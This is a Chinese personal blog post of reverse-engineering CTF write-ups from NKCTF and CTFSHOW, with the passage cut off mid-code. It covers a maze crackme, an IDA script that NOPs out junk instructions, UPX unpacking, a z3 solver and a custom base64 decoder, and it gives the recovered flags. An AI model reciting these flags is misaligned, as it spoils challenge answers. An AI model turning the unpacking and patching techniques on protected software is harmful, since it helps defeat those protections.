    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":["记录来时的路"]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":"#FF5722"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Juana_2uのhappyworld","subtitle":{"text":["BEING HAPPY IS THE MOST IMPORTANT!!"," I have a dream!","Sometimes you have to trust your gut.","If you start at the bottom,pay your dues,life here can be a dream come true.","Loading..."],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"links":{"github":null,"instagram":null,"zhihu":"https://www.zhihu.com/people/fawn-16-32","twitter":null,"email":null,"bilibili":"https://space.bilibili.com/440820814?spm_id_from=333.1007.0.0"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":true,"type":"fixed","audios":[{"name":"An der schönen blauen Donau,Walzer,op.314","artist":"Johann Strauss II","url":"https://open.spotify.com/embed/track/5odlY52u43F5BjByhxg7wg?utm_source=generator","cover":"http://p1.music.126.net/ZahwBmJHBnG9Gm4VC51Yew==/109951168758832434.jpg?param=180y180"},{"name":"City of Stars","artist":"Ryan Gosling,Emma Stone","url":"https://open.spotify.com/embed/track/1xk2Z84gbcn4tPXiiutxzS?utm_source=generator","cover":"http://p1.music.126.net/ZahwBmJHBnG9Gm4VC51Yew==/109951168758832434.jpg?param=180y180"},{"name":"Stray sheep","artist":"Kenshi Yonezu","url":"https://open.spotify.com/track/0iniTNHwqBiP4UDE1dgUpD?si=94e55cca33114e88","cover":"http://p1.music.126.net/ZahwBmJHBnG9Gm4VC51Yew==/109951168758832434.jpg?param=180y180"}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"About":{"icon":"fa-regular fa-user"},"tags":{"icon":"fa-solid fa-tags","path":"/tags/","categories":{"icon":"fa-solid fa-folder","path":"/categories/"},"Links":{"icon":"fa-regular fa-link"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2023/5/10 23:30:00"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
<div class="progress-bar-container">
    
        <span class="scroll-progress-bar"></span>
    

    
        <span class="pjax-progress-bar"></span>
        <span class="swup-progress-icon">
            <i class="fa-solid fa-circle-notch fa-spin"></i>
        </span>
    
</div>


<main class="page-container" id="swup">

    

    <div class="main-content-container">


        <div class="main-content-header">
            <header class="navbar-container">
    
    <div class="navbar-content">
        <div class="left">
            
                <a class="logo-image" href="/">
                    <img src="/images/logo.jpg">
                </a>
            
            <a class="logo-title" href="/">
                
                Juana_2u
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/"  >
                                    
                                        
                                            <i class="fa-regular fa-house"></i>
                                        
                                        HOME
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/archives"  >
                                    
                                        
                                            <i class="fa-regular fa-archive"></i>
                                        
                                        ARCHIVES
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/"  >
                                    
                                        
                                            <i class="fa-regular fa-user"></i>
                                        
                                        ABOUT
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/tags/"  >
                                    
                                        
                                            <i class="fa-solid fa-tags"></i>
                                        
                                        TAGS
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile drawer -->
    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/"  >
                             
                                
                                    <i class="fa-regular fa-house"></i>
                                
                                HOME
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/archives"  >
                             
                                
                                    <i class="fa-regular fa-archive"></i>
                                
                                ARCHIVES
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/"  >
                             
                                
                                    <i class="fa-regular fa-user"></i>
                                
                                ABOUT
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/tags/"  >
                             
                                
                                    <i class="fa-solid fa-tags"></i>
                                
                                TAGS
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            

        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="main-content-body">

            

            <div class="main-content">

                
                    <div class="post-page-container">
    <div class="article-content-container">

        <div class="article-title">
            
                <h1 class="article-title-regular">刷题记录</h1>
            
            </div>
            
                    
        
        
            <div class="article-header flex flex-row gap-2 items-center">
                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
                    <img src="/images/logo.jpg">
                </div>
                <div class="info flex flex-col justify-between">
                    <div class="author flex items-center">
                        <span class="name text-default-text-color text-lg font-semibold">Juana_2u</span>
                        
                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">记录来时的路</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2023-09-13 21:29:43</span>
        <span class="mobile">2023-09-13 21:29:43</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2023-10-14 11:43:16</span>
            <span class="mobile">2023-10-14 11:43:16</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/ctf-Replay/">ctf_Replay</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                    </div>
                </div>
            </div>
        

        


        <div class="article-content markdown-body">
            <h1 id="NKCTF20230318"><a href="#NKCTF20230318" class="headerlink" title="NKCTF20230318"></a>NKCTF20230318</h1><p><strong>PKMF</strong><br>题目描述：flag格式为nkctf{xxx}，flag全小写字母，中间的xxx为nkctf文件中写入的十六进制内容<br>直接进入主函数查看，这是简单整理后的主函数的样子，标上了一些比较显眼的变量和一些注释。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1680016194354-5acf3de7-44a7-4845-bc70-9dc959b203db.png"
                      alt="1680016194354-5acf3de7-44a7-4845-bc70-9dc959b203db"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1680016222684-73dc3bc6-fa4f-4274-84de-12e34ac7e8b3.png"
                      alt="1680016222684-73dc3bc6-fa4f-4274-84de-12e34ac7e8b3"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1680016248582-086abeb8-e51c-4f93-8ad1-32b37b3b9d27.png"
                      alt="1680016248582-086abeb8-e51c-4f93-8ad1-32b37b3b9d27"
                ></p>
<p>通过大体浏览后知道最后的“Congratulations! you found it!\n”是我们需要的最终结果，所以前面不能使程序退出。<br>ReadFile函数是从文件中读出数据，通过if语句可知，one_read_5的值只能是5，否则就会返回“Wrong”并且退出程序。同理可知下面的key_nkman的值只能是key_yilai数组的值，点进去查看是“6E6B6D616E”这样的一串。key_nkman就等于“6E6B6D616E”。<br>继续往下 <code>HEX_0x15 += key_nkman[time++];</code>HEX_0x15是key_nkman数组的和，<code>0x6E 0x6B 0x6D 0x61 0x6E</code>和为0x215，又由于<code>HEX_0x15</code>是char类型，两个字节高位溢出，即<code>HEX_0x15</code>值是0x15<br>再往下是一个迷宫的描述，可以找到迷宫的原来的字符组成拼接一下，用脚本把迷宫的样子画出来<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1680017946667-566df722-3daa-4300-8d18-9f0b55e69d59.png"
                      alt="1680017946667-566df722-3daa-4300-8d18-9f0b55e69d59"
                ></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span> s[] = <span class="string">&quot;******************N...*****...*....***.*****..*...**.*...*****.*****.*.*.**....*..*...*..*....**.*.*..*...***.**...*.*.*******..*****..*......**.*......**.****.**...*****...*K...********************&quot;</span>;</span><br><span class="line">	<span class="type">int</span> i, j;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">11</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">18</span>; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (s[i * <span class="number">18</span> + j] == <span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">				cout &lt;&lt; <span class="string">&quot;.&quot;</span> &lt;&lt; <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (s[i * <span class="number">18</span> + j] == <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">				cout &lt;&lt; <span class="string">&quot;*&quot;</span> &lt;&lt; <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				cout &lt;&lt; s[i * <span class="number">18</span> + j] &lt;&lt; <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>每一行是18个元素，最后迷宫是长这样的<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1680018030630-5eae6acc-261e-4922-9018-d5031089879d.png"
                      alt="1680018030630-5eae6acc-261e-4922-9018-d5031089879d"
                ><br>既然知道是迷宫了，可由下面while for双嵌套语句中知道上下左右分别是0（上）1（右）2（下）3（左）<br>while（time&lt;16)得到每四个为一组的迷宫路径是：<code>1122 3322 1223 2211 0111 1101 0000 0101 1211 0111 2223 2330 3323 2211 1112 2333</code><br>在线转获得 <code>0x5A 0xFA 0x6B 0xA5 0x15 0x51 0x00 0x11 0x65 0x15 0xAB 0xBC 0xFB 0xA5 0x56 0xBF  </code><br>再由路径的4进制转为16进制与值为0x15的<code>HEX_0x15</code>进行异或操作。<br>最后可以使用脚本获得后面的flag数值</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">enc=[<span class="number">0x5A</span>,<span class="number">0xFA</span>,<span class="number">0x6B</span>,<span class="number">0xA5</span>,<span class="number">0x15</span>,<span class="number">0x51</span>,<span class="number">0x00</span>,<span class="number">0x11</span>,<span class="number">0x65</span>,<span class="number">0x15</span> ,<span class="number">0xAB</span>,<span class="number">0xBC</span>,<span class="number">0xFB</span>,<span class="number">0xA5</span>,<span class="number">0x56</span>,<span class="number">0xBF</span>]</span><br><span class="line">flag= []</span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    flag.<span class="built_in">append</span>(<span class="built_in">hex</span>(enc[i]^<span class="number">0x15</span>))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>
<p>[‘0x4f’, ‘0xef’, ‘0x7e’, ‘0xb0’, ‘0x0’, ‘0x44’, ‘0x15’, ‘0x4’, ‘0x70’, ‘0x0’, ‘0xbe’, ‘0xa9’, ‘0xee’, ‘0xb0’, ‘0x43’, ‘0xaa’]<br>加上上面从文件读取到的<br>flag就是nkctf{056e6b6d616e4fef7eb0004415047000bea9eeb043aa}</p>
<h2 id="ealier"><a href="#ealier" class="headerlink" title="ealier"></a>ealier</h2><p>运行程序后发现程序没有任何反应，查看发现存在花指令的干扰，所以首先要干的就是去花的工作。<br>先查看到的是call函数的花指令，同一种模式的去花，使用脚本完成。</p>
<blockquote>
<p>对应的ida版本对应的api函数不同，所以要注意使用的函数</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> ida_bytes   <span class="comment">#patch_byte函数的导入模块</span></span><br><span class="line"><span class="keyword">import</span> ida_search  <span class="comment">#ida_search函数的导入模块</span></span><br><span class="line"><span class="keyword">import</span> ida_idc     <span class="comment">#idc.next_head函数的导入模块</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_nop</span>(<span class="params">addr,endaddr</span>):</span><br><span class="line">    <span class="keyword">while</span> addr&lt;endaddr:</span><br><span class="line">        patch_byte(addr,<span class="number">0x90</span>)</span><br><span class="line">        addr+=<span class="number">1</span></span><br><span class="line">pattern =<span class="string">&quot;33 C0 85 C0 74 03 75 00 E8&quot;</span></span><br><span class="line">cur_addr=<span class="number">0x401000</span></span><br><span class="line">end_addr=<span class="number">0x405000</span></span><br><span class="line"><span class="keyword">while</span> cur_addr&lt;end_addr:</span><br><span class="line">    cur_addr=ida_search.find_binary(cur_addr,end_addr,pattern,<span class="number">0</span>,ida_search.SEARCH_DOWN)</span><br><span class="line">    <span class="comment">##ida_search.find_binary是对应着的7.7版本，（通过ida的报错改得）</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;patch address:&quot;</span>+<span class="built_in">str</span>(cur_addr))</span><br><span class="line">    <span class="keyword">if</span> cur_addr == idc.BADADDR: <span class="comment">#BADADDR无效地址</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        my_nop(cur_addr,cur_addr+<span class="number">9</span>)</span><br><span class="line">    cur_addr=idc.next_head(cur_addr)<span class="comment">#下一个指令的地址</span></span><br></pre></td></tr></table></figure></div>
<blockquote>
<p>ida_search.find_binary(cur_addr,end_addr,pattern,0,ida_search.SEARCH_DOWN)<br>五个参数分别是：起始位置、结束位置、</p>
<ul>
<li><strong>cur_addr</strong>：起始地址，搜索将从该地址开始。</li>
<li><strong>end_addr</strong>：结束地址，搜索将在该地址处停止。</li>
<li><strong>pattern</strong>：要搜索的二进制模式，可以是字节字符串或16进制字符串。例如，**”<strong>\x33\xC0\x85\xC0\x74\x03\x75\x00\xE8</strong>“**或”33 C0 85 C0 74 03 75 00 E8”。</li>
<li>**0 **默认值为0的参数用来表示标志的开关状态</li>
<li><strong>ida_search.SEARCH_DOWN</strong>：搜索标志，可以是以下之一或它们的组合：<ul>
<li><strong>ida_search.SEARCH_DOWN</strong>：向下搜索。</li>
<li><strong>ida_search.SEARCH_UP</strong>：向上搜索。</li>
<li><strong>ida_search.SEARCH_NEXT</strong>：搜索下一个匹配项。</li>
<li><strong>ida_search.SEARCH_CASE</strong>：区分大小写。</li>
<li><strong>ida_search.SEARCH_REGEX</strong>：启用正则表达式搜索。</li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="CTFSHOW-NKCTF-4月四周-20230417"><a href="#CTFSHOW-NKCTF-4月四周-20230417" class="headerlink" title="CTFSHOW-NKCTF-4月四周-20230417"></a>CTFSHOW-NKCTF-4月四周-20230417</h1><h3 id="flag白给"><a href="#flag白给" class="headerlink" title="flag白给"></a>flag白给</h3><p>一道易语言的题目，主要就是UPX_0.89.3xx的脱壳，简单对比一下就出来了</p>
<h3 id="数学不及格"><a href="#数学不及格" class="headerlink" title="数学不及格"></a>数学不及格</h3><p>分析代码<br>中间只有一个加密函数f，看起来像是斐波那契<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1681820255179-fd5b0100-eb51-458c-8b89-7c6245395d96.png"
                      alt="image.png"
                ><br>直接用爆破脚本 求出v10 v11 v12</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">v10= Real(<span class="string">&#x27;v10&#x27;</span>)</span><br><span class="line">v11 = Real(<span class="string">&#x27;v11&#x27;</span>)</span><br><span class="line">v12 = Real(<span class="string">&#x27;v12&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">s = Solver()</span><br><span class="line"> </span><br><span class="line">s.add(<span class="number">591286729879</span> - v10 == <span class="number">3563142128</span>)</span><br><span class="line">s.add( <span class="number">591286729879</span>- v11 == <span class="number">27692482650</span>)</span><br><span class="line">s.add( <span class="number">591286729879</span> - v12 == <span class="number">367672337</span>)</span><br><span class="line">s.add(<span class="number">58</span>+ v12 + v11 + v10 == <span class="number">19163201824812</span>)</span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">     result = s.model()</span><br><span class="line">     <span class="built_in">print</span>(result)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;no&quot;</span>)</span><br><span class="line">v1=<span class="built_in">hex</span>(<span class="number">591286729879</span>- <span class="number">0x233F0E151C</span>)</span><br><span class="line">v2=<span class="built_in">hex</span>(<span class="number">591286729879</span>-<span class="number">0x1B45F81A32</span>)</span><br><span class="line">v3=<span class="built_in">hex</span>(<span class="number">591286729879</span>-<span class="number">0x244C071725</span>)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(v1)</span><br><span class="line"><span class="built_in">print</span>(v2)</span><br><span class="line"><span class="built_in">print</span>(v3)</span><br><span class="line"></span><br><span class="line"><span class="comment">#no</span></span><br><span class="line"><span class="comment">#0x666c61677b</span></span><br><span class="line"><span class="comment">#0x6e65776265</span></span><br><span class="line"><span class="comment">#0x655f686572</span></span><br></pre></td></tr></table></figure></div>

<p>再用16进制的转文本的脚本得到flag</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hex_string =<span class="string">&#x27;666c61677b6e65776265655f686572&#x27;</span></span><br><span class="line">text = <span class="built_in">str</span>(<span class="built_in">bytes</span>.fromhex(hex_string), <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(text)  <span class="comment"># 输出 &#x27;Hello World&#x27;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="签退"><a href="#签退" class="headerlink" title="签退"></a>签退</h3><p>先反编译一下 安装了一个之前没安装好的新工具uncompyle6 </p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uncompyle6 -o pcat.py pcat.pyc</span><br><span class="line"><span class="comment">##默认文件夹是python下的文件夹 </span></span><br><span class="line"><span class="comment">##-o outfile必须先写，例如有一个pcat.pyc，想反编译输出文件为pcat.py</span></span><br></pre></td></tr></table></figure></div>

<p>反汇编出来的代码是</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.9.0</span></span><br><span class="line"><span class="comment"># Python bytecode version base 2.7 (62211)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.6.8 (tags/v3.6.8:3c6b436a57, Dec 24 2018, 00:16:47) [MSC v.1916 64 bit (AMD64)]</span></span><br><span class="line"><span class="comment"># Embedded file name: re3.py</span></span><br><span class="line"><span class="comment"># Compiled at: 2020-03-06 17:43:28</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">c_charset = string.ascii_uppercase + string.ascii_lowercase + string.digits + <span class="string">&#x27;()&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;BozjB3vlZ3ThBn9bZ2jhOH93ZaH9&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##string.ascii_uppercase：所有的大写字母</span></span><br><span class="line"><span class="comment">##string.ascii_lowercase：所有的小写字母</span></span><br><span class="line"><span class="comment">##string.digits：所有的数字</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###base64加密算法python的实现</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">origin_bytes</span>):</span><br><span class="line">    c_bytes = [ (<span class="string">&#x27;&#123;:0&gt;8&#125;&#x27;</span>).<span class="built_in">format</span>(<span class="built_in">str</span>(<span class="built_in">bin</span>(b)).replace(<span class="string">&#x27;0b&#x27;</span>, <span class="string">&#x27;&#x27;</span>)) <span class="keyword">for</span> b <span class="keyword">in</span> origin_bytes ]</span><br><span class="line">    <span class="comment">#将每一位bytes转换为二进制字符串 8位数字右对齐</span></span><br><span class="line">    </span><br><span class="line">    resp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    nums = <span class="built_in">len</span>(c_bytes) // <span class="number">3</span></span><br><span class="line">    remain = <span class="built_in">len</span>(c_bytes) % <span class="number">3</span></span><br><span class="line">    </span><br><span class="line">    integral_part = c_bytes[<span class="number">0</span>:<span class="number">3</span> * nums]</span><br><span class="line">    <span class="keyword">while</span> integral_part:</span><br><span class="line">        <span class="comment"># 取三个字节，以每6比特，转换为4个整数</span></span><br><span class="line">        tmp_unit = (<span class="string">&#x27;&#x27;</span>).join(integral_part[<span class="number">0</span>:<span class="number">3</span>])</span><br><span class="line">        tmp_unit = [ <span class="built_in">int</span>(tmp_unit[x:x + <span class="number">6</span>], <span class="number">2</span>) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">18</span>] ]</span><br><span class="line">        <span class="comment"># 取对应base64字符</span></span><br><span class="line">        resp += (<span class="string">&#x27;&#x27;</span>).join([ c_charset[i] <span class="keyword">for</span> i <span class="keyword">in</span> tmp_unit ])</span><br><span class="line">        integral_part = integral_part[<span class="number">3</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> remain:</span><br><span class="line">        remain_part = (<span class="string">&#x27;&#x27;</span>).join(c_bytes[<span class="number">3</span> * nums:]) + (<span class="number">3</span> - remain) * <span class="string">&#x27;0&#x27;</span> * <span class="number">8</span></span><br><span class="line">        <span class="comment"># 补齐三个字节，每个字节补充 0000 0000</span></span><br><span class="line">        tmp_unit = [ <span class="built_in">int</span>(remain_part[x:x + <span class="number">6</span>], <span class="number">2</span>) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">18</span>] ][:remain + <span class="number">1</span>]</span><br><span class="line">        resp += (<span class="string">&#x27;&#x27;</span>).join([ c_charset[i] <span class="keyword">for</span> i <span class="keyword">in</span> tmp_unit ]) + (<span class="number">3</span> - remain) * <span class="string">&#x27;.&#x27;</span></span><br><span 